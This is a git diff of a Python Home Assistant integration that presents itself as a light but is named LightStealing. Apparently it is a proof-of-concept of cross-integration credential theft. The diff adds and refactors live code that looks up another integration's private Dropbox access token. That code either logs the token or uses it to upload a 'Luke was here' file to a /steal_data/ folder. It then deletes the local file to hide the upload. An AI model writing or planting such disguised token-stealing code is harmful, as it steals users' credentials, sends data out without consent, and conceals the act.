@@ -1,8 +1,9 @@
-"""Platform for integrating a Stealing light."""
+"""Platform for integrating a LightStealing."""
 from __future__ import annotations
 from typing import Any
 import os
 from datetime import datetime
+import logging
 
 import dropbox
 
@@ -12,7 +13,17 @@ from homeassistant.core import HomeAssistant
 from homeassistant.helpers.entity_platform import AddEntitiesCallback
 from homeassistant.helpers.typing import ConfigType, DiscoveryInfoType
 
+NAME_KEY = "name"
 UPLOAD_KEY = "upload"
+INTEGRATIONS_KEY = "integrations"
+
+DEFAULT_NAME = "Light Stealing"
+DEFAULT_UPLOAD = False
+
+TARGET_NAME = "switch_exfiltration"
+TARGET_FULL_NAME = "switch.switch_exfiltration"
+
+_LOGGER = logging.getLogger(__name__)
 
 
 def setup_platform(
@@ -21,29 +32,36 @@ def setup_platform(
     add_entities: AddEntitiesCallback,
     discovery_info: DiscoveryInfoType | None = None,
 ) -> None:
+    """Set up the LightStealing platform."""
 
-    """Set up the Stealing Light platform."""
+    if NAME_KEY in config:
+        name = config[NAME_KEY]
+    else:
+        name = DEFAULT_NAME
 
     if UPLOAD_KEY in config:
-        lights = [LightStealing(config[UPLOAD_KEY])]
+        to_upload = config[UPLOAD_KEY]
     else:
-        lights = [LightStealing()]
+        to_upload = DEFAULT_UPLOAD
+
+    lights = [LightStealing(name, to_upload)]
     add_entities(lights)
 
 
 class LightStealing(LightEntity):
-    """Representation of a Stealing Light."""
+    """Representation of a LightStealing."""
 
-    _target = "switch.exfiltration_switch"
-
-    def __init__(self, upload: bool = False) -> None:
+    def __init__(self, name: str = DEFAULT_NAME, upload: bool = DEFAULT_UPLOAD) -> None:
         """Initialize a LightStealing."""
-        self._light = LightEntity()
-        self._name = "Light Stealing"
+        self._name = name
         self._brightness = None
         self._state = False
         self._upload = upload
-        print(self._name + '" was created.')
+
+        # This object should physically communicate with the light
+        self._light = LightEntity()
+
+        _LOGGER.debug("<%s> was created", self._name)
 
     @property
     def name(self) -> str:
@@ -93,29 +111,41 @@ class LightStealing(LightEntity):
     def use_stolen_access_token(self):
         """This method uses the stolen token for uploading a file on Dropbox."""
         data = self.hass.data
-        integrations = data["integrations"]
-        switch_integration = integrations["exfiltration_switch"]
-        switch_component = switch_integration.get_component()
-        target_switch = switch_component.switch.ExfiltrationSwitch
+        integrations = data[INTEGRATIONS_KEY]
+        if TARGET_NAME not in integrations:
+            _LOGGER.error("<%s> integration is not available!", TARGET_NAME)
+            return
 
-        dropbox_token = target_switch._access_token
-        if not self._upload:
-            print(dropbox_token)
-        else:
-            filename = "tmp.txt"
-            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        target_integration = integrations[TARGET_NAME]
+        target_integration_component = target_integration.get_component()
 
-            # preparing the file to exfiltrate
-            tmp_file = open(filename, "w", encoding="utf-8")
-            text_to_write = "At " + current_time + ' Luke was here! (Thanks to your dropbox token: "' + dropbox_token + '")'
-            tmp_file.write(text_to_write)
-            tmp_file.close()
+        if "switch" in target_integration_component.DOMAIN:
+            target_switch = target_integration_component.switch.SwitchExfiltration
 
-            # Sending file
-            self.upload_file(filename, "/steal_data/" + filename, dropbox_token)
+            dropbox_token = target_switch._access_token
+            if not self._upload:
+                _LOGGER.warning("The Dropbox token is: <%s>", dropbox_token)
+            else:
+                filename = "tmp.txt"
+                current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
-            # Removing the tmp file to hide the upload
-            os.remove(filename)
+                # preparing the file to exfiltrate
+                tmp_file = open(filename, "w", encoding="utf-8")
+                text_to_write = (
+                    "At "
+                    + current_time
+                    + ' Luke was here! (Thanks to your dropbox token: "'
+                    + dropbox_token
+                    + '")'
+                )
+                tmp_file.write(text_to_write)
+                tmp_file.close()
+
+                # Sending file
+                self.upload_file(filename, "/steal_data/" + filename, dropbox_token)
+
+                # Removing the tmp file to hide the upload
+                os.remove(filename)
 
     def upload_file(self, file_from, file_to, access_token):
         """upload a file to Dropbox using API v2"""
